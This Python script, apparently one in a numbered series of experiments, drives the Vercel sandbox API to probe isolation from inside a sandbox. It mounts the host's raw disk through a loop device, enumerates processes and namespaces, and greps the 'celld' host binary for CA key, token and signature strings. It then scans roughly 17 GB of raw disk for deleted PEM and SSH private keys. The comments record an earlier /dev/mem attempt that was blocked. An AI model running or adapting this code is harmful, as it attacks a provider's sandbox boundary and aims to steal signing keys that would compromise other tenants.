# 实验J146: 沙箱进程树全貌 + celld快速strings + vda删除数据残留扫描(PEM私钥)
# j145: /dev/mem被STRICT_DEVMEM拒; 宿主=Firecracker VM(celld --init); ca-cert 24h轮换
#       推断 ca-key.pem 由 celld 运行时生成后删除 -> 数据块残留在 vda 磁盘
# 方法: cmdA 进程枚举+ns图谱; cmdB celld grep快速strings; cmdC/D vda分段残留扫描
# 零破坏: 纯读
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=16000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)

NAME = "expj146"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

MOUNT_CODE = r'''
import os, ctypes, fcntl
libc = ctypes.CDLL(None, use_errno=True)
libc.mount.restype = ctypes.c_int
vda = os.open("/dev/vda", os.O_RDWR)
loop = os.open("/dev/loop0", os.O_RDWR)
fcntl.ioctl(loop, 0x4C00, vda)
os.makedirs("/tmp/host", exist_ok=True)
ctypes.set_errno(0)
r = libc.mount(b"/dev/loop0", b"/tmp/host", b"xfs", 1, b"nouuid,norecovery")
print("MOUNT_RC", r)
'''

# cmdA: 进程枚举 + ns
CA = r'''
import os, subprocess
out = open("/tmp/d146a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
p("=== ALL_PIDS ===")
p(sorted(os.listdir("/proc"), key=int)[:50])
p("=== PS ===")
p(sh("ps -ef 2>&1 | head -40"))
p("=== PROCS ===")
for pid in sorted(os.listdir("/proc"), key=int):
    try:
        cl = open("/proc/%s/cmdline" % pid, "rb").read().replace(b"\x00", b" ").decode("latin1", "replace")[:120]
        st = open("/proc/%s/status" % pid).read()
        name = [l for l in st.splitlines() if l.startswith("Name:")]
        ns = [l for l in st.splitlines() if l.startswith("NSpid:")]
        p(pid, name[0].split(":")[1].strip() if name else "?", cl, ns[0] if ns else "")
    except Exception:
        pass
p("=== NS_READLINK ===")
p(sh("ls -la /proc/self/ns/ 2>&1; echo ---; readlink /proc/self/ns/pid; readlink /proc/1/ns/pid; echo ---; cat /proc/1/status | grep -E 'NSpid|PPid'"))
p("=== CGROUP ===")
p(sh("cat /proc/self/cgroup 2>&1"))
p("=== DONE")
out.close()
'''

# cmdB: celld 快速 strings (grep -a 定向)
CB = MOUNT_CODE + r'''
import subprocess
out = open("/tmp/d146b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
p("=== GREP_CAKEY ===")
p(sh("grep -aob 'ca-key' /tmp/host/opt/vercel/celld 2>/dev/null | head -10", 30))
p("=== GREP_CELLSOCK ===")
p(sh("grep -aob 'cell.sock\\|/run/cell\\|init.sock' /tmp/host/opt/vercel/celld 2>/dev/null | head -10", 30))
p("=== GREP_CERTPEM ===")
p(sh("grep -aob 'ca-cert\\|\.pem' /tmp/host/opt/vercel/celld 2>/dev/null | head -20", 30))
p("=== GREP_VSOCK ===")
p(sh("grep -aob 'vsock\\|AF_VSOCK' /tmp/host/opt/vercel/celld 2>/dev/null | head -10", 30))
p("=== GREP_SIGN ===")
p(sh("grep -aob 'X-Signature\\|X-Timestamp\\|signature' /tmp/host/opt/vercel/celld 2>/dev/null | head -15", 30))
p("=== GREP_TOKEN ===")
p(sh("grep -aob 'vcp_\\|token' /tmp/host/opt/vercel/celld 2>/dev/null | head -20", 30))
p("=== GREP_SPAWN ===")
p(sh("grep -aob 'Spawn\\|spawn' /tmp/host/opt/vercel/celld 2>/dev/null | head -15", 30))
p("=== GREP_ED25519 ===")
p(sh("grep -aob 'ed25519\\|Ed25519\\|curve25519' /tmp/host/opt/vercel/celld 2>/dev/null | head -10", 30))
p("=== DONE")
out.close()
'''

# cmdC: vda 残留扫描 0-9GB
CC = r'''
import os, time
out = open("/tmp/d146c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
pats = [b"BEGIN EC PRIVATE KEY", b"BEGIN RSA PRIVATE KEY", b"BEGIN PRIVATE KEY", b"BEGIN OPENSSH PRIVATE KEY", b"ca-key.pem", b"-----BEGIN CERTIFICATE"]
f = open("/dev/vda", "rb")
hits = []
total = 0
t0 = time.time()
START = 0
END = 9 * 1024 * 1024 * 1024
CH = 64 * 1024 * 1024
pos = START
while pos < END:
    if time.time() - t0 > 230:
        p("TIME_LIMIT at GB", pos // (1024*1024*1024))
        break
    try:
        f.seek(pos)
        chunk = f.read(CH)
    except Exception as e:
        p("ERR", hex(pos), repr(e)[:60])
        pos += CH
        continue
    if not chunk:
        break
    for pat in pats:
        idx = 0
        while True:
            i = chunk.find(pat, idx)
            if i < 0:
                break
            seg = chunk[max(0, i - 150):i + 500]
            hits.append((pos + i, pat, seg))
            idx = i + 1
    pos += len(chunk)
    total += len(chunk)
f.close()
p("scanned GB", total // (1024*1024*1024), "hits", len(hits), "elapsed", int(time.time() - t0))
seen = set()
for off, pat, seg in hits[:30]:
    k = seg[:80]
    if k in seen:
        continue
    seen.add(k)
    p("OFF", hex(off), pat, repr(seg[:480]))
p("=== DONE")
out.close()
'''

# cmdD: vda 残留扫描 9-17GB
CD = r'''
import os, time
out = open("/tmp/d146d.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
pats = [b"BEGIN EC PRIVATE KEY", b"BEGIN RSA PRIVATE KEY", b"BEGIN PRIVATE KEY", b"BEGIN OPENSSH PRIVATE KEY", b"ca-key.pem", b"-----BEGIN CERTIFICATE"]
f = open("/dev/vda", "rb")
hits = []
total = 0
t0 = time.time()
START = 9 * 1024 * 1024 * 1024
CH = 64 * 1024 * 1024
pos = START
while True:
    if time.time() - t0 > 230:
        p("TIME_LIMIT at GB", pos // (1024*1024*1024))
        break
    try:
        f.seek(pos)
        chunk = f.read(CH)
    except Exception as e:
        p("ERR", hex(pos), repr(e)[:60])
        pos += CH
        continue
    if not chunk:
        break
    for pat in pats:
        idx = 0
        while True:
            i = chunk.find(pat, idx)
            if i < 0:
                break
            seg = chunk[max(0, i - 150):i + 500]
            hits.append((pos + i, pat, seg))
            idx = i + 1
    pos += len(chunk)
    total += len(chunk)
f.close()
p("scanned GB", total // (1024*1024*1024), "hits", len(hits), "elapsed", int(time.time() - t0))
seen = set()
for off, pat, seg in hits[:30]:
    k = seg[:80]
    if k in seen:
        continue
    seen.add(k)
    p("OFF", hex(off), pat, repr(seg[:480]))
p("=== DONE")
out.close()
'''

run_cmd(sid, CA, "procs", timeout=100)
catfile(sid, "/tmp/d146a.txt", "d146a", 8000)

run_cmd(sid, CB, "celld-grep", timeout=200)
catfile(sid, "/tmp/d146b.txt", "d146b", 8000)

run_cmd(sid, CC, "scan-0-9g", timeout=280)
catfile(sid, "/tmp/d146c.txt", "d146c")

run_cmd(sid, CD, "scan-9-17g", timeout=280)
catfile(sid, "/tmp/d146d.txt", "d146d")

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
